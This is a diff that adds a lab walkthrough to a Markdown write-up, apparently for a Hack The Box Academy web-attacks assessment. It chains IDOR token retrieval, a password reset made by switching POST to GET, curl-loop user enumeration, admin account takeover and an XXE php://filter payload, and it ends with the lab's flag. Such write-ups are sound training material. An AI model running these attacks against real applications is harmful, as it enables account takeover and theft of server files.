@@ -1229,3 +1229,280 @@ In this case, the extracted file is saved as:
 This confirms successful **automated out-of-band data exfiltration** via XXE.
 
 ---
+
+## Web Attacks - Exploitation Example
+
+The objective of this exercise is to escalate privileges and exploit multiple vulnerabilities in order to retrieve the flag located at:
+
+```
+/flag.php
+
+```
+Authenticate to `IP:PORT` using the following credentials:
+
+- `htb-student` 
+- `Academy_student!`
+
+**Initial Reconnaissance:**
+
+After authentication, we are presented with an **employee profile page**:
+
+![Filtered output](images/exploitation.png)
+
+The application uses PHP, as indicated by the file extension:
+
+```
+http://94.237.60.55:30663/profile.php
+```
+
+Navigating to the `Settings` section redirects us to:
+
+```
+http://94.237.60.55:30663/settings.php
+```
+
+![Filtered output](images/exploitation2.png)
+
+The only available functionality on this page is password reset.
+
+**Password Reset Analysis:**
+
+When changing the password, the application performs a `GET` request to the following API endpoint:
+
+```
+http://94.237.60.55:30663/api.php/token/74
+```
+
+![Filtered output](images/exploitation3.png)
+
+The response contains an API token in `JSON` format:
+
+```json
+{"token":"e51a8a14-17ac-11ec-8e67-a3c050fe0c26"}
+```
+
+![Filtered output](images/exploitation4.png)
+
+Immediately after, the application sends a `POST` request to:
+
+```
+http://94.237.60.55:30663/reset.php
+```
+
+![Filtered output](images/exploitation5.png)
+
+This request includes:
+
+- `uid`
+- API `token`
+- New `password`
+
+**Identifying an IDOR Vulnerability:**
+
+Revisiting the original token request, we attempt to modify the `uid` value both in the URL and in the cookie:
+
+```
+http://94.237.60.55:30663/api.php/token/1
+
+Cookie: PHPSESSID=t2mmsfv...dnc2; uid=1
+```
+
+![Filtered output](images/exploitation6.png)
+
+The server returns a **valid API token for another user**:
+
+```json
+{"token":"e51a7c5e-17ac-11ec-8e1e-2f59f27bf33c"}
+```
+
+![Filtered output](images/exploitation7.png)
+
+This confirms the presence of an **Insecure Direct Object Reference (IDOR)** vulnerability.
+
+**Attempted Password Reset (POST):**
+
+We attempt to reuse the new API token to reset the password of `uid=1` via the original `POST` request:
+
+![Filtered output](images/exploitation8.png)
+
+The server responds with:
+
+```
+Access Denied
+```
+
+![Filtered output](images/exploitation9.png)
+
+We attempt to bypass the restriction by changing the request method from `POST` to `GET`:
+
+```
+http://94.237.60.55:30663/reset.php?uid=1&token=e51a7c5e-17ac-11ec-8e1e-2f59f27bf33c&password=test
+```
+
+![Filtered output](images/exploitation10.png)
+
+The response confirms success:
+
+```
+Password changed successfully
+```
+
+![Filtered output](images/exploitation11.png)
+
+We have successfully exploited **IDOR via HTTP verb tampering**.
+
+**Enumerating Users via IDOR:**
+
+Upon login, the application sends the following request:
+
+```
+http://94.237.60.55:30663/api.php/user/74
+```
+
+![Filtered output](images/exploitation12.png)
+
+Response:
+
+```json
+{"uid":"74", "username":"htb-student", "full_name":"Paolo Perrone", "company":"Schaefer Inc"}
+```
+
+![Filtered output](images/exploitation13.png)
+
+Changing the `uid` parameter returns information for other users:
+
+```
+http://94.237.60.55:30663/api.php/user/1
+```
+
+![Filtered output](images/exploitation14.png)
+
+This confirms **unauthenticated user enumeration via IDOR**.
+
+We automate enumeration using a `Bash` script:
+
+```bash
+#!/bin/bash
+
+for uid in {1..100}; do
+	curl -s "http://IP:PORT/api.php/user/$uid"; echo
+done
+```
+
+Filtering results for administrative accounts:
+
+```bash
+./exploit.sh | grep -i "admin" | jq
+```
+
+We identify an administrator account:
+
+```json
+{"uid":"52", "username":"a.corrales", "full_name":"Amor Corrales", "company":"Administrator"}
+```
+
+![Filtered output](images/exploitation15.png)
+
+**Administrator Account Takeover:**
+
+First, we retrieve a valid API token for the administrator:
+
+```
+http://94.237.60.55:30663/api.php/token/52
+
+Cookie: PHPSESSID=t2mmsfv...dnc2; uid=52
+```
+
+Response:
+
+```
+{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
+```
+
+![Filtered output](images/exploitation16.png)
+
+Using HTTP verb tampering, we reset the administrator password:
+
+```
+http://94.237.60.55:30663/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=test
+```
+
+![Filtered output](images/exploitation17.png)
+
+We can now log in as administrator:
+
+```
+a.corrales:test
+```
+
+![Filtered output](images/exploitation18.png)
+
+At this point, **privilege escalation is complete**.
+
+**XXE Exploitation to Read Flag:**
+
+Within the administrator interface, we discover an `ADD EVENT` function:
+
+![Filtered output](images/exploitation19.png)
+
+Creating a new event reveals that the application submits data in `XML` format:
+
+![Filtered output](images/exploitation20.png)
+
+![Filtered output](images/exploitation21.png)
+
+The response reflects the XML `<name>` element, indicating a potential **XXE injection point**.
+
+Since the flag is stored in a PHP file, we use the PHP base64 filter to safely extract its contents.
+
+Inject the following `DOCTYPE` declaration after the XML declaration:
+
+```xml
+<!DOCTYPE email [
+<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
+]>
+```
+
+Reference the entity in the vulnerable element:
+
+```xml
+<name>
+  &test;
+</name>
+```
+
+![Filtered output](images/exploitation22.png)
+
+The server responds with base64-encoded data:
+
+```
+Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.
+```
+
+![Filtered output](images/exploitation23.png)
+
+Decode the output locally:
+
+```bash
+echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d
+```
+
+Flag:
+
+```
+HTB{m4573r_w3b_4774ck3r}
+```
+
+![Filtered output](images/exploitation24.png)
+
+In this assessment, we successfully chained multiple web vulnerabilities:
+
+- IDOR to access unauthorized resources
+- HTTP verb tampering to bypass access controls
+- User enumeration via vulnerable API endpoints
+- Privilege escalation through account takeover
+- XXE injection to read local files on the server
+
+This demonstrates how seemingly minor vulnerabilities can be combined into a full compromise chain, ultimately leading to sensitive data disclosure.
+
+---
